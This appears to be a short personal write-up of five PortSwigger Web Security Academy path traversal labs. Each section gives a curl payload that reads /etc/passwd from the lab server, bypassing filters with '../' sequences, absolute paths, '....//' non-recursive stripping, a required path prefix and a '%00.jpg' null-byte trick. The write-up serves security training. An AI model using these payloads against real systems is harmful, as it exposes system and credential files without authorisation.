# Path traversal

- https://portswigger.net/web-security/file-path-traversal

## File path traversal, simple case

Images present on the website

```
<img src="/image?filename=20.jpg">
```

Injecting `../` into `filename` param does the trick and retrives the file:

```
curl https://0a7000b80364f75481ee258800ad000d.web-security-academy.net/image?filename=../../../etc/passwd
```

## File path traversal, traversal sequences blocked with absolute path bypass

Same images as before.

Injecting `../` respond with `No such file`, but reading by absolute path `/etc/passwd` bypasses this defense:

```
curl https://0a84007e03e9507485edd59800410022.web-security-academy.net/image?filename=/etc/passwd
```

## File path traversal, traversal sequences stripped non-recursively

Same images as above.

Pattern `../` gets stripped one time, but not recusrively, so injecting `....//` will be stripped to `../`, which will allow to bypass the defanse and get Path Traversal.

```
curl https://0a76006d04446a3c82a0ab4f003200ba.web-security-academy.net/image?filename=....//....//....//....//....//etc/passwd
```

## File path traversal, validation of start of path

Same images as before, but this time starting with `/var/www/images`.

```
/image?filename=/var/www/images/71.jpg
```

Trying to remove the `/var/www/images/` in the path returned error `"Missing parameter 'filename'"`, so I suspect this prefix is neccessary.

Accessing the image and adjusting the path still gets us the image:

```
/image?filename=/var/www/images/../images/71.jpg
```

To retrieve the `/etc/passwd`:

```
curl https://0a99003a031b543b819b7f0600e9000d.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd
```

## File path traversal, validation of file extension with null byte bypass

Page contains images:

```
<img src="/image?filename=60.jpg">
```

Changing the `filename` param still retrieves us the image:

```
/image?filename=../images/60.jpg
```

Changing filename like this respond with `No such file` error

```
/image?filename=../../../../etc/passwd
```

But adding null `%00` separated supported extension retrieves the file

```
/image?filename=../../../../etc/passwd%00.jpg
```

Null must be terminating string before the extension during file loading, but it allows to check for last 4 characters on input sanitization.

```
curl https://0a8b00f10481f9688226337300b60043.web-security-academy.net/image?filename=../../../../etc/passwd%00.jpg
```
